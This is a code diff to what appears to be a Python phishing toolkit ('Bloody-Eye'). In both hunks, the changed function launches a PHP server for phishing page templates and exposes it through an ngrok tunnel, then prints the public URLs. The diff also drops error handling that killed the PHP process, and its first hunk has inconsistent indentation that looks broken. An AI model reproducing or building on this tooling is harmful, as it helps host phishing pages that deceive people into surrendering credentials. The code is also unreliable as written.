@@ -530,17 +530,12 @@ exit();""")
     print("")
     def ngrokserver():
        bannner.banner2()
-       try:                   
-          global token
+       with open("log","w") as phplog:
+          Popen(("php","-S","localhost:6060","-t","../Bloody-Eye/templates/phishing"),stderr=phplog,stdout=phplog)
+       global token
           a = ngrok.connect(6060,"http",auth_token=token)
-          print("\n"+Fore.RED+" ["+Fore.WHITE+"~"+Fore.RED+"]"+Fore.BLUE+" URL 1 :"+Fore.GREEN+str(a).replace('"','').replace("NgrokTunnel:","").replace("http","https").replace("-> https://localhost:6060",""))
-          print("\n"+Fore.RED+" ["+Fore.WHITE+"~"+Fore.RED+"]"+Fore.BLUE+" URL 2 :"+Fore.GREEN+str(a).replace('"','').replace("NgrokTunnel:","").replace("-> http://localhost:6060",""))
-       except:
-          with open("logs/exit","w") as kill:
-             Popen(("killall","-KILL","php"),stdout=kill,stderr=kill)
-             print(" ")
-             sys.exit()
-    
+       print("\n"+Fore.RED+" ["+Fore.WHITE+"~"+Fore.RED+"]"+Fore.BLUE+" URL 1 :"+Fore.GREEN+str(a).replace('"','').replace("NgrokTunnel:","").replace("http","https").replace("-> https://localhost:6060",""))
+       print("\n"+Fore.RED+" ["+Fore.WHITE+"~"+Fore.RED+"]"+Fore.BLUE+" URL 2 :"+Fore.GREEN+str(a).replace('"','').replace("NgrokTunnel:","").replace("-> http://localhost:6060",""))
     v = input(Fore.RED+" ["+Fore.WHITE+"~"+Fore.RED+Fore.RED+"]"+Fore.CYAN+" Select a Port Forwarding Service : ")
     if v == "01":
       bannner.banner2()
@@ -970,17 +965,13 @@ exit();
     print(Fore.RED+" ["+Fore.WHITE+"02"+Fore.RED+"]"+Fore.YELLOW+" Ngorok.io")
     print("")
     def ngrokserver():
+       with open("log","w") as phplog:
+          Popen(("php","-S","localhost:6060","-t","../Bloody-Eye/templates/phishing"),stderr=phplog,stdout=phplog)
        bannner.banner2()
-       try:                   
-          global token
-          a = ngrok.connect(6060,"http",auth_token=token)
-          print("\n"+Fore.RED+" ["+Fore.WHITE+"~"+Fore.RED+"]"+Fore.BLUE+" URL 1 :"+Fore.GREEN+str(a).replace('"','').replace("NgrokTunnel:","").replace("http","https").replace("-> https://localhost:6060",""))
-          print("\n"+Fore.RED+" ["+Fore.WHITE+"~"+Fore.RED+"]"+Fore.BLUE+" URL 2 :"+Fore.GREEN+str(a).replace('"','').replace("NgrokTunnel:","").replace("-> http://localhost:6060",""))
-       except:
-          with open("logs/exit","w") as kill:
-             Popen(("killall","-KILL","php"),stdout=kill,stderr=kill)
-             print(" ")
-             sys.exit()
+       global token
+       a = ngrok.connect(6060,"http",auth_token=token)
+       print("\n"+Fore.RED+" ["+Fore.WHITE+"~"+Fore.RED+"]"+Fore.BLUE+" URL 1 :"+Fore.GREEN+str(a).replace('"','').replace("NgrokTunnel:","").replace("http","https").replace("-> https://localhost:6060",""))
+       print("\n"+Fore.RED+" ["+Fore.WHITE+"~"+Fore.RED+"]"+Fore.BLUE+" URL 2 :"+Fore.GREEN+str(a).replace('"','').replace("NgrokTunnel:","").replace("-> http://localhost:6060",""))
     
     v = input(Fore.RED+" ["+Fore.WHITE+"~"+Fore.RED+Fore.RED+"]"+Fore.CYAN+" Select a Port Forwarding Service : ")
     if v == "01":
